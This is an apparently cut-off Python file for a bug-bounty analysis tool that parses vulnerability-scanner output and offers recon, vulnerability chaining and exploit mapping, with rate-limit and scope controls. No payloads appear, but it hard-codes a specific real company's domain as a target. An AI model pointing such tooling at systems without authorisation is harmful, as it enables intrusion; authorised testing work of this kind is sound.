import json
import requests
import re
import sys
import os
import time
from urllib.parse import urlparse
from datetime import datetime
from collections import defaultdict
import subprocess

# colors
try:
    from termcolor import colored
except:
    def colored(text, color=None, attrs=None):
        return text

try:
    import pyfiglet
except:
    pyfiglet = None


class DataExtractor:
    """
    Intelligent data extractor - reads Dark Wxlf output and extracts everything
    even though it's not explicitly structured for us
    """
    
    def __init__(self, json_file):
        with open(json_file) as f:
            self.raw_data = json.load(f)
        
        # extracted stuff
        self.target = None
        self.subdomains = set()
        self.endpoints = set()
        self.web_apps = []
        self.vulnerabilities = []
        self.tech_stack = {}
        
        # run extraction
        self.extract_all()
    
    def extract_all(self):
        """extract everything intelligently from dark wxlf json"""
        
        # get target
        self.target = self.raw_data.get('target', '')
        
        # get vulnerabilities (already there)
        self.vulnerabilities = self.raw_data.get('vulnerabilities', [])
        
        # extract subdomains from vuln urls
        for vuln in self.vulnerabilities:
            url = vuln.get('url', '')
            subdomain = self.extract_subdomain(url)
            if subdomain:
                self.subdomains.add(subdomain)
        
        # extract endpoints from vuln urls
        for vuln in self.vulnerabilities:
            url = vuln.get('url', '')
            if url:
                self.endpoints.add(url)
        
        # build web apps list from unique base urls
        seen_bases = set()
        for vuln in self.vulnerabilities:
            url = vuln.get('url', '')
            base_url = self.get_base_url(url)
            if base_url and base_url not in seen_bases:
                seen_bases.add(base_url)
                self.web_apps.append({
                    'url': base_url,
                    'subdomain': self.extract_subdomain(url)
                })
        
        # infer tech stack from evidence
        self.infer_tech_stack()
        
        print(colored("[✓] Extracted from Dark Wxlf data:", 'green'))
        print(f"    Target: {self.target}")
        print(f"    Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"    Subdomains: {len(self.subdomains)}")
        print(f"    Endpoints: {len(self.endpoints)}")
        print(f"    Web apps: {len(self.web_apps)}")
    
    def extract_subdomain(self, url):
        """get subdomain from url"""
        try:
            parsed = urlparse(url)
            return parsed.netloc
        except:
            return None
    
    def get_base_url(self, url):
        """get base url without path"""
        try:
            parsed = urlparse(url)
            return f"{parsed.scheme}://{parsed.netloc}"
        except:
            return url
    
    def infer_tech_stack(self):
        """infer tech stack from vulnerability evidence and urls"""
        for vuln in self.vulnerabilities:
            url = vuln.get('url', '')
            base_url = self.get_base_url(url)
            
            # look for tech indicators
            evidence = str(vuln.get('evidence', '')).lower()
            vuln_type = str(vuln.get('type', '')).lower()
            
            techs = []
            
            # common indicators
            if 'php' in evidence or '.php' in url:
                techs.append('PHP')
            if 'asp.net' in evidence or '.aspx' in url:
                techs.append('ASP.NET')
            if 'wordpress' in evidence or 'wp-content' in url:
                techs.append('WordPress')
            if 'api' in url or 'rest' in evidence:
                techs.append('REST API')
            if 'graphql' in url or 'graphql' in vuln_type:
                techs.append('GraphQL')
            if 'jwt' in vuln_type:
                techs.append('JWT Auth')
            if 'node' in evidence or 'express' in evidence:
                techs.append('Node.js')
            if 'python' in evidence or 'flask' in evidence or 'django' in evidence:
                techs.append('Python')
            
            if techs and base_url:
                if base_url not in self.tech_stack:
                    self.tech_stack[base_url] = []
                self.tech_stack[base_url].extend(techs)
        
        # deduplicate
        for url in self.tech_stack:
            self.tech_stack[url] = list(set(self.tech_stack[url]))


class WxlfF33d:
    """
    The Wxlf You F33d - Advanced Intelligence Analysis
    """
    
    def __init__(self):
        self.target = None
        self.subdomains = set()
        self.endpoints = set()
        self.web_apps = []
        self.vulnerabilities = []
        self.tech_stack = {}
        
        # findings
        self.shadow_assets = []
        self.chains = []
        self.exploit_guides = []
        
        # scope management
        self.in_scope = []  # list of domains/URLs in scope
        self.out_of_scope = []  # list of domains/URLs out of scope
        self.scope_enabled = False  # whether to filter by scope
        
        # bug bounty safe mode
        self.bug_bounty_mode = False
        self.rate_limit_enabled = False
        self.max_requests_per_second = 10  # conservative default
        self.request_delay = 0.1  # 100ms between requests
        self.last_request_time = 0
        self.total_requests = 0
        self.respect_robots = True
        
        # metadata
        self.start_time = datetime.now()
    
    def banner(self):
        """show banner"""
        # clean blue cyber theme
        print()
        print(colored("╔" + "═" * 68 + "╗", 'blue', attrs=['bold']))
        print(colored("║" + " " * 68 + "║", 'blue', attrs=['bold']))
        
        # compact ascii banner
        lines = [
            "  ████████╗██╗  ██╗██████╗     ██╗    ██╗██╗  ██╗██╗     ███████╗",
            "  ╚══██╔══╝██║  ██║╚════██╗    ██║    ██║╚██╗██╔╝██║     ██╔════╝",
            "     ██║   ███████║ █████╔╝    ██║ █╗ ██║ ╚███╔╝ ██║     █████╗  ",
            "     ██║   ██╔══██║ ╚═══██╗    ██║███╗██║ ██╔██╗ ██║     ██╔══╝  ",
            "     ██║   ██║  ██║██████╔╝    ╚███╔███╔╝██╔╝ ██╗███████╗██║     ",
            "     ╚═╝   ╚═╝  ╚═╝╚═════╝      ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝     ",
            "           ██╗   ██╗ ██████╗ ██╗   ██╗                           ",
            "           ╚██╗ ██╔╝██╔═══██╗██║   ██║                           ",
            "            ╚████╔╝ ██║   ██║██║   ██║                           ",
            "             ╚██╔╝  ██║   ██║██║   ██║                           ",
            "              ██║   ╚██████╔╝╚██████╔╝                           ",
            "              ╚═╝    ╚═════╝  ╚═════╝                            ",
            "           ███████╗██████╗ ██████╗ ██████╗                      ",
            "           ██╔════╝╚════██╗╚════██╗██╔══██╗                     ",
            "           █████╗   █████╔╝ █████╔╝██║  ██║                     ",
            "           ██╔══╝   ╚═══██╗ ╚═══██╗██║  ██║                     ",
            "           ██║     ██████╔╝██████╔╝██████╔╝                     ",
            "           ╚═╝     ╚═════╝ ╚═════╝ ╚═════╝                      ",
        ]
        
        for line in lines:
            padded = line[:66].ljust(68)
            print(colored("║", 'blue', attrs=['bold']) + colored(padded, 'cyan', attrs=['bold']) + colored("║", 'blue', attrs=['bold']))
        
        print(colored("║" + " " * 68 + "║", 'blue', attrs=['bold']))
        print(colored("║" + "  Shadow Recon • Chain Hunter • Exploit Mapper  ".center(68) + "║", 'blue', attrs=['bold']))
        print(colored("║" + " " * 68 + "║", 'blue', attrs=['bold']))
        print(colored("╚" + "═" * 68 + "╝", 'blue', attrs=['bold']))
        print()
    

    
    def enforce_rate_limit(self):
        """enforce rate limiting for bug bounty safe mode"""
        if not self.rate_limit_enabled:
            return
        
        current_time = time.time()
        time_since_last = current_time - self.last_request_time
        
        if time_since_last < self.request_delay:
            time.sleep(self.request_delay - time_since_last)
        
        self.last_request_time = time.time()
        self.total_requests += 1
    
    def check_scope(self, url):
        """check if URL is in scope for bug bounty mode"""
        if not self.scope_enabled:
            return True
        
        for scope_item in self.in_scope:
            if scope_item in url:
                for out_item in self.out_of_scope:
                    if out_item in url:
                        return False
                return True
        return False
    
    def enable_bug_bounty_mode(self):
        """enable bug bounty safe mode with all compliance features"""
        self.bug_bounty_mode = True
        self.rate_limit_enabled = True
        self.scope_enabled = True
        print(colored("[*] Bug Bounty Safe Mode ENABLED", 'green', attrs=['bold']))
        print(colored(f"    Rate limit: {self.max_requests_per_second} requests/second", 'green'))
        print(colored("    Scope filtering: ACTIVE", 'green'))
        print(colored("    robots.txt: RESPECTED", 'green'))
        print()
    
    def safe_request(self, method='get', url='', **kwargs):
        """wrapper for requests that enforces rate limiting and scope checking"""
        if self.scope_enabled and not self.check_scope(url):
            return None
        
        self.enforce_rate_limit()
        
        try:
            if method.lower() == 'get':
                return requests.get(url, **kwargs)
            elif method.lower() == 'post':
                return requests.post(url, **kwargs)
            elif method.lower() == 'put':
                return requests.put(url, **kwargs)
            elif method.lower() == 'delete':
                return requests.delete(url, **kwargs)
        except Exception as e:
            return None
    
    def toggle_rate_limit(self, enabled=None):
        """toggle rate limiting on or off"""
        if enabled is None:
            self.rate_limit_enabled = not self.rate_limit_enabled
        else:
            self.rate_limit_enabled = enabled
        
        status = "ENABLED" if self.rate_limit_enabled else "DISABLED"
        print(colored(f"[*] Rate limiting {status}", 'yellow'))
        if self.rate_limit_enabled:
            print(colored(f"    Max: {self.max_requests_per_second} requests/second", 'yellow'))
    
    def set_rate_limit(self, max_rps):
        """set custom rate limit"""
        if max_rps <= 0:
            print(colored("[!] Rate limit must be positive", 'red'))
            return
        
        self.max_requests_per_second = max_rps
        self.request_delay = 1.0 / max_rps
        print(colored(f"[*] Rate limit set to {max_rps} requests/second", 'green'))
    
    def log(self, msg, level="info"):
        """logging with blue cyber theme"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if level == "info":
            print(f"[{colored(timestamp, 'blue')}] [{colored('', 'cyan')}] {colored(msg, 'white')}")
        elif level == "success":
            print(f"[{colored(timestamp, 'blue')}] [{colored('✓', 'green', attrs=['bold'])}] {colored(msg, 'green')}")
        elif level == "error":
            print(f"[{colored(timestamp, 'blue')}] [{colored('', 'red', attrs=['bold'])}] {colored(msg, 'red')}")
        elif level == "warning":
            print(f"[{colored(timestamp, 'blue')}] [{colored('⚠', 'yellow', attrs=['bold'])}] {colored(msg, 'yellow')}")
        elif level == "phase":
            print()
            print(colored("╔" + "═" * 68 + "╗", 'blue', attrs=['bold']))
            print(colored("║" + f"  {msg}".ljust(68) + "║", 'cyan', attrs=['bold']))
            print(colored("╚" + "═" * 68 + "╝", 'blue', attrs=['bold']))
            print()
    
    def load_data(self, source=None):
        """
        load data from multiple sources:
        - Dark Wxlf JSON
        - Plain text file
        - Manual input
        """
        
        if not source:
            # no file - manual input
            return self.manual_input()
        
        # detect file type
        if source.endswith('.json'):
            return self.load_from_json(source)
        elif source.endswith('.txt'):
            return self.load_from_txt(source)
        else:
            self.log(f"Unknown file format: {source}", "error")
            return self.manual_input()
    
    def load_from_json(self, json_file):
        """smart json loader - handles dark wxlf format"""
        
        self.log(f"Loading data from {json_file}...", "info")
        
        try:
            with open(json_file) as f:
                data = json.load(f)
            
            # detect if it's dark wxlf format
            if 'target' in data and 'vulnerabilities' in data:
                self.log("Detected Dark Wxlf format", "success")
                extractor = DataExtractor(json_file)
                
                # import extracted data
                self.target = extractor.target
                self.subdomains = extractor.subdomains
                self.endpoints = extractor.endpoints
                self.web_apps = extractor.web_apps
                self.vulnerabilities = extractor.vulnerabilities
                self.tech_stack = extractor.tech_stack
                
                return True
            else:
                self.log("Unknown JSON format - trying generic import", "warning")
                return False
                
        except Exception as e:
            self.log(f"Error loading JSON: {str(e)}", "error")
            return False
    
    def load_from_txt(self, txt_file):
        """load from plain text - UNIVERSAL ELITE parser for ALL dark wxlf formats"""
        
        self.log(f"Loading from text file: {txt_file}", "info")
        
        try:
            with open(txt_file) as f:
                content = f.read()
                lines = [line.strip() for line in content.split('\n') if line.strip()]
            
            # Show file stats
            import os
            file_size = os.path.getsize(txt_file)
            size_str = f"{file_size/1024:.1f}KB" if file_size < 1024*1024 else f"{file_size/(1024*1024):.1f}MB"
            
            print(colored(f"    → File size: {size_str}", 'cyan'))
            print(colored(f"    → Total lines: {len(lines)}", 'cyan'))
            print(colored("    → Parsing vulnerabilities...", 'cyan'))
            
            # Extract target from filename or first URL
            if 'mheducation.com' in txt_file or 'mheducation' in content.lower():
                self.target = 'mheducation.com'
            elif lines:
                # Try to extract from first URL
                for line in lines[:50]:
                    url = self.extract_url_from_line(line)
                    if url:
                        parsed = urlparse(url)
                        # Get base domain (e.g., example.com from sub.example.com)
                        domain_parts = parsed.netloc.split('.')
                        if len(domain_parts) >= 2:
                            self.target = '.'.join(domain_parts[-2:])
                        break
            
            # UNIVERSAL PARSER - handles multiple formats
            vulns_found = 0
            i = 0
            
            while i < len(lines):
                line = lines[i]
                
                # ========================================
                # FORMAT 1: Dark Wxlf "FINDING #XX" format
                # ========================================
                if line.startswith('FINDING #') and 'FINDING #' in line:
                    # Extract vulnerability type from this line
                    # Example: "FINDING #33: Missing Rate Limiting"
                    parts = line.split(':', 1)
                    if len(parts) > 1:
                        vuln_type = parts[1].strip()
                    else:
                        vuln_type = 'Unknown'
                    
                    # Look ahead for Severity, URL, Parameter
                    severity = 'MEDIUM'
                    url = None
                    param = None
                    evidence_parts = []
                    
                    # Scan next 20 lines for details
                    for j in range(i+1, min(i+20, len(lines))):
                        next_line = lines[j]
                        
                        # Stop at next finding
                        if next_line.startswith('FINDING #'):
                            break
                        
                        # Extract severity
                        if next_line.startswith('Severity:'):
                            # Example: "Severity: MEDIUM | CVSS: 5.3 MEDIUM"
                            severity_part = next_line.split('|')[0].replace('Severity:', '').strip()
                            severity_words = severity_part.split()
                            if severity_words:
                                severity = severity_words[0].upper()
                        
                        # Extract URL
                        elif next_line.startswith('URL:'):
                            url = next_line.replace('URL:', '').strip()
                        
                        # Extract parameter
                        elif next_line.startswith('Parameter:'):
                            param = next_line.replace('Parameter:', '').strip()
                        
                        # Collect evidence
                        elif next_line.startswith('Evidence:'):
                            evidence_parts.append(next_line.replace('Evidence:', '').strip())
                        elif next_line.startswith('Impact:'):
                            evidence_parts.append(next_line.replace('Impact:', '').strip())
                    
                    # Add vulnerability if we have required data
                    if url and vuln_type != 'Unknown':
                        evidence = ' '.join(evidence_parts)[:300] if evidence_parts else f"Found {vuln_type}"
                        
                        self.vulnerabilities.append({
                            'type': vuln_type,
                            'url': url,
                            'severity': severity,
                            'param': param if param else '',
                            'evidence': evidence
                        })
                        
                        vulns_found += 1
                        
                        # Add to endpoints
                        self.endpoints.add(url)
                        parsed = urlparse(url)
                        if parsed.netloc:
                            self.subdomains.add(parsed.netloc)
                        
                        # Show progress
                        if vulns_found % 5 == 0:
                            print(colored(f"    → Parsed {vulns_found} vulnerabilities...", 'green'))
                
                # ========================================
                # FORMAT 2: Original [SEVERITY] format
                # ========================================
                elif re.match(r'\[(CRITICAL|HIGH|MEDIUM|LOW)\]', line, re.IGNORECASE):
                    severity_match = re.match(r'\[(CRITICAL|HIGH|MEDIUM|LOW)\]\s+(.+)', line, re.IGNORECASE)
                    
                    if severity_match:
                        severity = severity_match.group(1).upper()
                        vuln_desc = severity_match.group(2)
                        
                        # Extract vulnerability type from description
                        vuln_type = self.extract_vuln_type_elite(vuln_desc)
                        
                        # Extract URL from this line
                        url = self.extract_url_from_line(line)
                        
                        # If no URL in current line, check next few lines
                        if not url:
                            for j in range(i+1, min(i+10, len(lines))):
                                next_line = lines[j]
                                # Stop if we hit another vulnerability
                                if re.match(r'\[(CRITICAL|HIGH|MEDIUM|LOW)\]', next_line, re.IGNORECASE):
                                    break
                                potential_url = self.extract_url_from_line(next_line)
                                if potential_url:
                                    url = potential_url
                                    break
                        
                        # Collect evidence from next few lines
                        evidence_lines = [line]
                        for j in range(i+1, min(i+5, len(lines))):
                            next_line = lines[j]
                            # Stop if we hit another vulnerability
                            if re.match(r'\[(CRITICAL|HIGH|MEDIUM|LOW)\]', next_line, re.IGNORECASE):
                                break
                            if not next_line.lower().startswith('subdomain'):
                                evidence_lines.append(next_line)
                        
                        evidence = ' '.join(evidence_lines)[:300]
                        
                        # Only add if we have minimum required data
                        if vuln_type and url:
                            self.vulnerabilities.append({
                                'type': vuln_type,
                                'url': url,
                                'severity': severity,
                                'evidence': evidence
                            })
                            
                            vulns_found += 1
                            
                            # Show progress
                            if vulns_found % 5 == 0:
                                print(colored(f"    → Parsed {vulns_found} vulnerabilities...", 'green'))
                
                # ========================================
                # Extract endpoints and subdomains from ALL lines
                # ========================================
                if line.startswith('http'):
                    self.endpoints.add(line)
                    parsed = urlparse(line)
                    if parsed.netloc:
                        self.subdomains.add(parsed.netloc)
                elif '.' in line and not any(char in line for char in [' ', ':', '[', ']', '(', ')', '=']) and not line.lower().startswith(('target', 'evidence', 'parameter', 'poc', 'impact', 'finding')):
                    # looks like a clean domain
                    if line.count('.') >= 1 and not line.startswith('=='):
                        self.subdomains.add(line)
                
                i += 1
            
            print()
            print(colored("╔" + "═" * 68 + "╗", 'blue'))
            print(colored("║" + "  FILE LOADED SUCCESSFULLY".ljust(68) + "║", 'green', attrs=['bold']))
            print(colored("╠" + "═" * 68 + "╣", 'blue'))
            print(colored("║", 'blue') + f"  Target:          {colored(self.target or 'Unknown', 'cyan')}".ljust(77) + colored("║", 'blue'))
            print(colored("║", 'blue') + f"  Subdomains:      {colored(str(len(self.subdomains)), 'yellow')}".ljust(77) + colored("║", 'blue'))
            print(colored("║", 'blue') + f"  Endpoints:       {colored(str(len(self.endpoints)), 'yellow')}".ljust(77) + colored("║", 'blue'))
            print(colored("║", 'blue') + f"  Vulnerabilities: {colored(str(len(self.vulnerabilities)), 'red' if self.vulnerabilities else 'yellow')}".ljust(87) + colored("║", 'blue'))
            print(colored("╚" + "═" * 68 + "╝", 'blue'))
            
            # Show sample vulnerabilities found
            if self.vulnerabilities:
                print()
                print(colored("    [SAMPLE VULNERABILITIES FOUND]", 'yellow', attrs=['bold']))
                for vuln in self.vulnerabilities[:3]:
                    print(f"    • {colored(vuln.get('type', 'Unknown'), 'cyan')} - {colored(vuln.get('severity', 'MEDIUM'), 'red')}")
                    print(f"      {vuln.get('url', '')[:70]}")
                if len(self.vulnerabilities) > 3:
                    print(f"    ... and {len(self.vulnerabilities) - 3} more")
            
            return True
            
        except Exception as e:
            self.log(f"Error loading text file: {str(e)}", "error")
            return False
    
    def extract_vuln_type_elite(self, description):
        """ELITE vulnerability type extraction with better matching"""
        desc_upper = description.upper()
        
        # Comprehensive mapping with better patterns
        vuln_patterns = {
            # XSS variants
            'XSS (Reflected)': ['XSS (REFLECTED)', 'REFLECTED XSS', 'XSS REFLECTED'],
            'XSS (Stored)': ['XSS (STORED)', 'STORED XSS', 'PERSISTENT XSS'],
            'XSS (DOM)': ['XSS (DOM)', 'DOM XSS', 'DOM-BASED XSS'],
            'XSS': ['CROSS-SITE SCRIPTING', 'XSS'],
            
            # SQL Injection
            'SQL Injection': ['SQL INJECTION', 'SQLI', 'SQL INJ'],
            
            # CSRF
            'CSRF': ['CSRF', 'CROSS-SITE REQUEST FORGERY', 'XSRF'],
            
            # IDOR
            'IDOR': ['IDOR', 'INSECURE DIRECT OBJECT REFERENCE', 'INSECURE DIRECT OBJECT'],
            
            # SSRF
            'SSRF': ['SSRF', 'SERVER-SIDE REQUEST FORGERY', 'SERVER SIDE REQUEST'],
            
            # XXE
            'XXE': ['XXE', 'XML EXTERNAL ENTITY', 'XML EXTERNAL'],
            
            # File Inclusion
            'Local File Inclusion': ['LFI', 'LOCAL FILE INCLUSION', 'LOCAL FILE INCLUDE'],
            'Remote File Inclusion': ['RFI', 'REMOTE FILE INCLUSION', 'REMOTE FILE INCLUDE'],
            
            # Code Execution
            'Remote Code Execution': ['RCE', 'REMOTE CODE EXECUTION', 'CODE EXECUTION'],
            'Command Injection': ['COMMAND INJECTION', 'OS COMMAND INJECTION', 'CMD INJECTION'],
            
            # Redirect
            'Open Redirect': ['OPEN REDIRECT', 'UNVALIDATED REDIRECT', 'URL REDIRECT'],
            
            # CORS
            'CORS Misconfiguration': ['CORS MISCONFIGURATION', 'CORS MISCONFIG', 'CORS'],
            
            # Subdomain Takeover
            'Subdomain Takeover': ['SUBDOMAIN TAKEOVER', 'SUBDOMAIN HIJACKING', 'DANGLING DNS'],
            
            # Authentication
            'Authentication Bypass': ['AUTHENTICATION BYPASS', 'AUTH BYPASS', 'BROKEN AUTHENTICATION'],
            'Broken Authentication': ['BROKEN AUTH', 'WEAK AUTHENTICATION'],
            'Broken Access Control': ['BROKEN ACCESS CONTROL', 'BAC'],
            
            # Information Disclosure
            'Information Disclosure': ['INFORMATION DISCLOSURE', 'INFO DISCLOSURE', 'INFORMATION LEAKAGE', 'DATA EXPOSURE'],
            'Sensitive Data Exposure': ['SENSITIVE DATA EXPOSURE', 'SENSITIVE DATA', 'DATA LEAK'],
            
            # File Upload
            'Arbitrary File Upload': ['FILE UPLOAD', 'ARBITRARY FILE UPLOAD', 'UNRESTRICTED FILE UPLOAD'],
            
            # Clickjacking
            'Clickjacking': ['CLICKJACKING', 'UI REDRESSING', 'IFRAME INJECTION'],
            
            # API
            'API Abuse': ['API ABUSE', 'API MISCONFIGURATION'],
            'Rate Limit Bypass': ['RATE LIMIT', 'RATE LIMITING', 'NO RATE LIMIT'],
        }
        
        # Check each pattern
        for vuln_type, patterns in vuln_patterns.items():
            for pattern in patterns:
                if pattern in desc_upper:
                    return vuln_type
        
        # If no match, return description up to first space or 50 chars
        return description.split()[0] if ' ' in description else description[:50]
    
    def extract_url_from_line(self, line):
        """extract URL from line"""
        import re
        url_pattern = r'https?://[^\s<>"{}|\\^`\[\]]+'
        match = re.search(url_pattern, line)
        if match:
            return match.group(0)
        return None
    
    def extract_severity(self, line):
        """extract severity from line"""
        line_upper = line.upper()
        if 'CRITICAL' in line_upper:
            return 'CRITICAL'
        elif 'HIGH' in line_upper:
            return 'HIGH'
        elif 'MEDIUM' in line_upper:
            return 'MEDIUM'
        elif 'LOW' in line_upper:
            return 'LOW'
        else:
            return 'MEDIUM'  # default
    
    def manual_input(self):
        """smart data input - only asks for what's needed"""
        
        # show startup animation first
        self.startup_screen()
        
        # show banner
        self.banner()
        
        # ask if they have a file - no scary messages
        print()
        has_file = input(colored("[?] Load data from file? (yes/no): ", 'cyan', attrs=['bold'])).strip().lower()
        
        if has_file in ['yes', 'y']:
            print()
            filepath = input(colored("[?] Enter file path (.json or .txt): ", 'cyan', attrs=['bold'])).strip()
            
            if os.path.exists(filepath):
                # try to load it
                print()
                print(colored(f"[] Loading {filepath}...", 'cyan'))
                
                # determine type and load
                if filepath.endswith('.json'):
                    if self.load_from_json(filepath):
                        print(colored("[✓] Data loaded successfully!", 'green', attrs=['bold']))
                        time.sleep(1)
                        
                        # clear screen and continue to sweet ui
                        os.system('clear' if os.name == 'posix' else 'cls')
                        return True
                elif filepath.endswith('.txt'):
                    if self.load_from_txt(filepath):
                        print(colored("[✓] Data loaded successfully!", 'green', attrs=['bold']))
                        
                        # if txt file, might need vulnerabilities
                        if not self.vulnerabilities:
                            print()
                            has_vulns = input(colored("[?] Add vulnerability data? (yes/no): ", 'cyan', attrs=['bold'])).strip().lower()
                            
                            if has_vulns in ['yes', 'y']:
                                self.add_vulnerabilities()
                        
                        time.sleep(1)
                        os.system('clear' if os.name == 'posix' else 'cls')
                        return True
                else:
                    print(colored("[!] Unsupported file type - use .json or .txt", 'yellow'))
                    time.sleep(1)
            else:
                print()
                print(colored("[!] File not found", 'yellow'))
                time.sleep(1)
        
        # if no file or file failed, ask for minimal data
        print()
        print(colored("╔" + "═" * 68 + "╗", 'blue'))
        print(colored("║" + "  QUICK DATA ENTRY".ljust(68) + "║", 'cyan', attrs=['bold']))
        print(colored("╚" + "═" * 68 + "╝", 'blue'))
        print()
        
        # just get target - we can work with that
        self.target = input(colored("[?] Target domain: ", 'cyan', attrs=['bold'])).strip()
        
        # optional: add subdomains
        print()
        add_subs = input(colored("[?] Add subdomains? (yes/no): ", 'cyan', attrs=['bold'])).strip().lower()
        
        if add_subs in ['yes', 'y']:
            print(colored("    Enter subdomains (one per line, empty to finish):", 'white'))
            while True:
                sub = input(colored("    > ", 'blue')).strip()
                if not sub:
                    break
                self.subdomains.add(sub)
            
            if self.subdomains:
                print(colored(f"    [✓] Added {len(self.subdomains)} subdomains", 'green'))
        
        # optional: add vulnerabilities
        print()
        add_vulns = input(colored("[?] Add vulnerabilities? (yes/no): ", 'cyan', attrs=['bold'])).strip().lower()
        
        if add_vulns in ['yes', 'y']:
            self.add_vulnerabilities()
        
        print()
        print(colored("[✓] Ready to analyze!", 'green', attrs=['bold']))
        time.sleep(1)
        
        # clear screen and continue to sweet ui
        os.system('clear' if os.name == 'posix' else 'cls')
        
        return True
    
    def add_vulnerabilities(self):
        """helper to add vulnerabilities"""
        print()
        print(colored("    Format: type|url|severity", 'white'))
        print(colored("    Example: XSS|https://example.com/search|HIGH", 'white'))
        print()
        
        while True:
            vuln_line = input(colored("    > ", 'blue')).strip()
            if not vuln_line:
                break
            
            parts = vuln_line.split('|')
            if len(parts) >= 3:
                self.vulnerabilities.append({
                    'type': parts[0],
                    'url': parts[1],
                    'severity': parts[2],
                    'evidence': 'Manually entered'
                })
        
        if self.vulnerabilities:
            print(colored(f"    [✓] Added {len(self.vulnerabilities)} vulnerabilities", 'green'))
    
    def startup_screen(self):
        """show cool startup screen like dark wxlf"""
        import os
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print()
        print(colored("    ╔════════════════════════════════════════════════════════════╗", 'blue'))
        print(colored("    ║                                                            ║", 'blue'))
        print(colored("    ║", 'blue') + colored("               INITIALIZING INTELLIGENCE SYSTEM", 'cyan', attrs=['bold']) + colored("            ║", 'blue'))
        print(colored("    ║                                                            ║", 'blue'))
        print(colored("    ╚════════════════════════════════════════════════════════════╝", 'blue'))
        print()
        
        # loading animation
        loading_items = [
            ("Loading data extraction modules", 0.3),
            ("Initializing shadow recon engine", 0.3),
            ("Starting chain analysis systems", 0.3),
            ("Preparing exploit mapper", 0.3),
            ("Calibrating threat intelligence", 0.3),
        ]
        
        for item, delay in loading_items:
            print(colored(f"    [] {item}...", 'cyan'), end='', flush=True)
            time.sleep(delay)
            print(colored(" ✓", 'green'))
        
        print()
        print(colored("    [✓] System ready", 'green', attrs=['bold']))
        time.sleep(0.5)
        
        import os
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def run(self, skip_startup=False):
        """main execution flow with sweet interactive ui"""
        
        # startup screen first (unless already shown in manual input)
        if not skip_startup:
            self.startup_screen()
            self.banner()
        else:
            # just show banner again after manual input
            self.banner()
        
        # show loaded data with fancy box
        print(colored("╔" + "═" * 68 + "╗", 'blue'))
        print(colored("║" + "  DATA LOADED".ljust(68) + "║", 'blue', attrs=['bold']))
        print(colored("╠" + "═" * 68 + "╣", 'blue'))
        print(colored("║", 'blue') + f"  Target:          {colored(self.target, 'cyan', attrs=['bold'])}".ljust(77) + colored("║", 'blue'))
        print(colored("║", 'blue') + f"  Subdomains:      {colored(str(len(self.subdomains)), 'yellow')}".ljust(77) + colored("║", 'blue'))
        print(colored("║", 'blue') + f"  Endpoints:       {colored(str(len(self.endpoints)), 'yellow')}".ljust(77) + colored("║", 'blue'))
        print(colored("║", 'blue') + f"  Vulnerabilities: {colored(str(len(self.vulnerabilities)), 'red' if self.vulnerabilities else 'yellow')}".ljust(87) + colored("║", 'blue'))
        print(colored("╚" + "═" * 68 + "╝", 'blue'))
        print()
        
        # sweet interactive menu
        while True:
            self.show_main_menu()
            
            choice = input(colored("\n[?] Select option: ", 'cyan', attrs=['bold'])).strip()
            print()
            
            if choice == '1':
                self.shadow_recon()
                input(colored("\n[Press Enter to continue]", 'yellow'))
            elif choice == '2':
                self.chain_hunter()
                input(colored("\n[Press Enter to continue]", 'yellow'))
            elif choice == '3':
                self.exploit_mapper()
                input(colored("\n[Press Enter to continue]", 'yellow'))
            elif choice == '4':
                # full analysis
                self.shadow_recon()
                print()
                self.chain_hunter()
                print()
                self.exploit_mapper()
                input(colored("\n[Press Enter to continue]", 'yellow'))
            elif choice == '5':
                # view current findings
                self.view_findings()
                input(colored("\n[Press Enter to continue]", 'yellow'))
            elif choice == '6':
                # generate report and exit
                self.generate_report()
                break
            elif choice == '7' or choice.lower() == 'b' or choice.lower() == 'beginner':
                # Beginner mode
                self.beginner_recommendation()
                input(colored("\n[Press Enter to continue]", 'yellow'))
            elif choice == '8' or choice.lower() == 's' or choice.lower() == 'scope':
                # Scope Manager
                self.scope_manager()
            elif choice == '9':
                # Bug Bounty Mode
                self.configure_bug_bounty_mode()
            elif choice == '0' or choice.lower() == 'exit':
                print(colored("[!] Exiting without generating report...", 'yellow'))
                break
            else:
                print(colored("[!] Invalid choice - try again", 'red'))
                time.sleep(1)
    
    def scope_manager(self):
        """manage in-scope and out-of-scope domains/URLs"""
        
        while True:
            print()
            print(colored("╔" + "═" * 68 + "╗", 'blue'))
            print(colored("║" + "   SCOPE MANAGER".ljust(68) + "║", 'cyan', attrs=['bold']))
            print(colored("╠" + "═" * 68 + "╣", 'blue'))
            print(colored("║", 'blue'))
            
            # Show current scope status
            scope_status = colored("ENABLED", 'green', attrs=['bold']) if self.scope_enabled else colored("DISABLED", 'red', attrs=['bold'])
            print(colored("║  ", 'blue') + f"Scope Filtering: {scope_status}".ljust(68) + colored("║", 'blue'))
            print(colored("║  ", 'blue') + f"In-Scope Items: {colored(str(len(self.in_scope)), 'green')}".ljust(77) + colored("║", 'blue'))
            print(colored("║  ", 'blue') + f"Out-of-Scope Items: {colored(str(len(self.out_of_scope)), 'red')}".ljust(77) + colored("║", 'blue'))
            print(colored("║", 'blue'))
            print(colored("╠" + "═" * 68 + "╣", 'blue'))
            print(colored("║", 'blue'))
            print(colored("║  ", 'blue') + colored("1", 'cyan', attrs=['bold']) + "  Add In-Scope      " + colored("→", 'blue') + "  Add domains/URLs to scope".ljust(45) + colored("║", 'blue'))
            print(colored("║  ", 'blue') + colored("2", 'cyan', attrs=['bold']) + "  Add Out-of-Scope  " + colored("→", 'blue') + "  Add items to exclude".ljust(45) + colored("║", 'blue'))
            print(colored("║  ", 'blue') + colored("3", 'yellow', attrs=['bold']) + "  View Scope        " + colored("→", 'blue') + "  Show current scope rules".ljust(45) + colored("║", 'blue'))
            print(colored("║  ", 'blue') + colored("4", 'magenta', attrs=['bold']) + "  Toggle Filtering  " + colored("→", 'blue') + "  Enable/disable scope filter".ljust(45) + colored("║", 'blue'))
            print(colored("║  ", 'blue') + colored("5", 'red', attrs=['bold']) + "  Clear Scope       " + colored("→", 'blue') + "  Remove all scope rules".ljust(45) + colored("║", 'blue'))
            print(colored("║  ", 'blue') + colored("6", 'green', attrs=['bold']) + "  Apply & Filter    " + colored("→", 'blue') + "  Filter findings by scope".ljust(45) + colored("║", 'blue'))
            print(colored("║  ", 'blue') + colored("0", 'white', attrs=['bold']) + "  Back to Main Menu " + colored("→", 'blue') + "  Return to main menu".ljust(45) + colored("║", 'blue'))
